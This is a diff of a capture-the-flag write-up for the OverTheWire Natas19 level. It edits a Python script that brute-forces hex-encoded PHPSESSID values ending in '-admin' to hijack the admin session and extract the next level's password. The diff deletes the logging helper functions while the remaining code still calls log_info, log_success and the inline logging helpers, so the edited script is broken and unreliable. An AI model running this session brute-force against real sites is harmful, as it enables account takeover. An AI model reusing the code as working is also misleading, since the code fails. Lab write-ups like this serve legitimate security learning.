@@ -60,33 +60,8 @@ In order to find the admin's correct session now we need to bruteforce the rest 
 ## 🤖 Python solution
 
 ```python
-import requests,re,time, sys
+import requests,re,sys
 
-# =======================
-# === STYLING HELPERS ===
-# =======================
-GREEN = "\033[92m"
-RED = "\033[91m"
-YELLOW = "\033[93m"
-CYAN = "\033[96m"
-RESET = "\033[0m"
-
-def log_info(message):
-    print(f"{CYAN}[*] {message}{RESET}")
-
-def log_success(message):
-    print(f"{GREEN}[+] {message}{RESET}")
-
-
-def log_progress_inline(message, color=CYAN):
-    sys.stdout.write(f"\r{YELLOW}{message}{RESET}")
-    sys.stdout.flush()
-
-def log_found_inline(message):
-    sys.stdout.write(f"\r{YELLOW}{message}{RESET}\n")
-    sys.stdout.flush()
-
-# ======================= 
 # === CONFIG === 
 url = "http://natas19.natas.labs.overthewire.org"
 username = "natas19"
@@ -99,9 +74,11 @@ log_info("Starting brute-force on natas19...")
 
 while phpsesidMin <= phpsesidMax:
 
+    # Iterate through chronological hex characters
     stringHex = "".join("{:02x}".format(ord(c)) for c in str(phpsesidMin))
     adminHex = "2d61646d696e" # -admin
 
+    # Inject the SESSID with chronological hex  
     sesID = "PHPSESSID=" + stringHex + adminHex
     log_progress_inline(sesID)
 
@@ -109,13 +86,14 @@ while phpsesidMin <= phpsesidMax:
     response = requests.get(url,headers=headers, auth=(username,natas19_password),verify=False)
 
     if "You are an admin." in response.text:
+
+        # Get the password from website output
         match = re.search(r"Password:\s*([^\s<]+)", response.text)        
         if match:
             password = match.group(1)
             log_found_inline(f"Admin session found! PHPSESSID={sesID}")
             log_success(f"Natas20 password: {password}")
             break
-
     phpsesidMin = phpsesidMin + 1
 ```
 
